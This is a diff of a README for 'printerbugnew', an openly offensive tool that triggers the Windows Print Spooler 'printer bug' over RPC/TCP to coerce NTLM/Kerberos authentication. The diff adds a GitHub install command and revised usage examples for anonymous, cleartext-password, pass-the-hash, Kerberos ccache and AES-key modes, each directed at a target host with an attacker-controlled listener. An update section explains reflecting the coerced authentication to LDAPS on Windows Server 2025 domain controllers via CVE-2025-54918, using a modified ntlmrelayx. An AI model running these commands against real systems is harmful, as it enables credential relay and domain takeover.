@@ -1,13 +1,18 @@
 # Pure RPC over TCP Printer Spooler Trigger
 ## For Windows 11 22H2+ / Windows Server 2025
 
+## Install
+
+```bash
+uv tool install git+https://github.com/0xNDI/printerbugnaew
+```
 
 ## Usage
 ```
-uv run --with impacket printerbugnew.py -t TARGET [-u USERNAME] [-p PASSWORD]
-                                         [-H NTHASH] [-d DOMAIN] [-l LISTENER]
-                                         [-k] [--ccache FILE] [--aes-key HEXKEY]
-                                         [--dc-ip IP] [--port PORT]
+printerbugnew -t TARGET [-u USERNAME] [-p PASSWORD]
+              [-H NTHASH] [-d DOMAIN] [-l LISTENER]
+              [-k] [--ccache FILE] [--aes-key HEXKEY]
+              [--dc-ip IP] [--port PORT]
 ```
 
 | Flag | Description |
@@ -28,32 +33,32 @@ uv run --with impacket printerbugnew.py -t TARGET [-u USERNAME] [-p PASSWORD]
 
 ### Anonymous
 ```bash
-uv run --with impacket printerbugnew.py -t 10.10.11.50 -l 10.10.14.5
+printerbugnew -t 10.10.11.50 -l 10.10.14.5
 ```
 
 ### Cleartext credentials
 ```bash
-uv run --with impacket printerbugnew.py -t 10.10.11.50 -u Administrator -p ‘P@ssw0rd’ -d CORP -l 10.10.14.5
+printerbugnew -t 10.10.11.50 -u Administrator -p 'P@ssw0rd' -d CORP -l 10.10.14.5
 ```
 
 ### Pass-the-hash
 ```bash
-uv run --with impacket printerbugnew.py -t 10.10.11.50 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d CORP -l 10.10.14.5
+printerbugnew -t 10.10.11.50 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d CORP -l 10.10.14.5
 ```
 
 ### Kerberos with ccache
 ```bash
-uv run --with impacket printerbugnew.py -t wmc-ca.corp.local -u ‘SVC$’ -d CORP --ccache svc.ccache --dc-ip 10.10.11.1 -l 10.10.14.5
+printerbugnew -t wmc-ca.corp.local -u 'SVC$' -d CORP --ccache svc.ccache --dc-ip 10.10.11.1 -l 10.10.14.5
 ```
 
 ### Kerberos with AES key (RC4/NTLM disabled environments)
 ```bash
-uv run --with impacket printerbugnew.py -t wmc-ca.corp.local -u ‘SVC$’ -d CORP --aes-key 1d313c73ad2864ad8102776b891f0616bd3cf03ac459a7d6da2f4cce36dc94ec --dc-ip 10.10.11.1 -l 10.10.14.5
+printerbugnew -t wmc-ca.corp.local -u 'SVC$' -d CORP --aes-key 1d313c73ad2864ad8102776b891f0616bd3cf03ac459a7d6da2f4cce36dc94ec --dc-ip 10.10.11.1 -l 10.10.14.5
 ```
 
 ### Specific RPC port (skip EPM lookup)
 ```bash
-uv run --with impacket printerbugnew.py -t 10.10.11.50 -u svc -H aad3b435b51404eeaad3b435b51404ee -d CORP -l 10.10.14.5 --port 49152
+printerbugnew -t 10.10.11.50 -u svc -H aad3b435b51404eeaad3b435b51404ee -d CORP -l 10.10.14.5 --port 49152
 ```
 
 ## Notes
@@ -72,7 +77,7 @@ uv run --with impacket printerbugnew.py -t 10.10.11.50 -u svc -H aad3b435b51404e
 <img width="548" height="332" alt="image" src="https://github.com/user-attachments/assets/84fe1c1b-4da2-4ce2-91c1-76e8c732b34f" /><br><br>
 ## Update for CVE-2025-54918
 This exploit via reflection works only on W2025 with the "new" printerbug (DCERPC instead of Named Pipes). 
-You’ll need to modify ntlmrelayx at a couple of points for it to work. After that, you can remotely trigger the printer bug on a W2025 DC and reflect authentication via LDAPS(!), even if Channel Bindings is **REQUIRED**<br>
+You'll need to modify ntlmrelayx at a couple of points for it to work. After that, you can remotely trigger the printer bug on a W2025 DC and reflect authentication via LDAPS(!), even if Channel Bindings is **REQUIRED**<br>
 
 ldaprelayclient.py:<br>
 <img width="595" height="184" alt="image" src="https://github.com/user-attachments/assets/77b0bd49-13a7-4cd5-b701-0622fedb427f" /><br>
@@ -87,5 +92,3 @@ The vulnerability was fixed in September 2025 Patch Tuesday: https://msrc.micros
 
 The fix ensures that the MIC is **always** calculated, even when the Type 3 message is empty.<br>
 <br>Thanks to the author of this CVE for a valuable hint :)
-
-
